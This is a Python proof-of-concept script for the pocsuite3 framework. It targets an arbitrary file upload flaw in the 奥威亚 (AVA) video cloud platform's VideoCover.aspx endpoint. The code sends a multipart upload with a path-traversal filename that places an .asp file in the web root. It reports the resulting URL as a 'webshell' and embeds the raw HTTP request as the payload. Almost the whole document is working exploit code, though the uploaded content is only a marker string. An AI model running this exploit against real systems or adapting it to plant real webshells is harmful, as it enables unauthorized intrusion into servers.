# _*_ coding:utf-8 _*_
# @Time : 2023/12/14 16:55
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class fanwei_yunqiaoe_bridge_sql(POCBase):
    pocDesc = '''奥威亚视屏云平台VideoCover任意文件上传'''
    vulID = '20231214'
    version = '1.0'
    author = '公众号网络安全透视镜'
    vulDate = '2023-12-14'
    createDate = '2023-12-14'
    updateDate = '2023-12-14'
    name = '奥威亚视屏云平台VideoCover任意文件上传'
    appName = '奥威亚视屏云平台'

    def _verify(self):

        result = {}
        url = self.url + '/Tools/Video/VideoCover.aspx'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Connection": "close",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
            "Upgrade-Insecure-Requests": "1",
            "Accept-Language": "zh-CN,zh;g=0.9",
        }

        data = {
            "file": (
            "/../../../AVA.ResourcesPlatform.WebUI/security.asp", "This website has a vulnerability!!!", "image/jpeg")
        }

        payload = """
        POST /Tools/Video/VideoCover.aspx HTTP/1.1
        Host: ip:port
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
        Accept-Encoding: gzip, deflate
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avifimage/webp,image/apng,*/*;q=0.8,application/signed-exchangev=b3;q=0.9
        Content-Type: multipart/form-data; boundary=68c4ca658cd4332dc386f53710e63a10

        --68c4ca658cd4332dc386f53710e63a10
        Content-Disposition: form-data; name="file"; filename="/../../../AVA.ResourcesPlatform.WebUI/security.asp"
        Content-Type: image/jpeg

        This website has a vulnerability!!!
        --68c4ca658cd4332dc386f53710e63a10--
        """
        try:

            response = requests.post(url, headers=headers, files=data,verify=False)
            if response.status_code == 200 and 'Success' in response.text:
                shell_path = self.url+'/security.asp'
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload
                result['VerifyInfo']['webshell'] = shell_path

            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(fanwei_yunqiaoe_bridge_sql)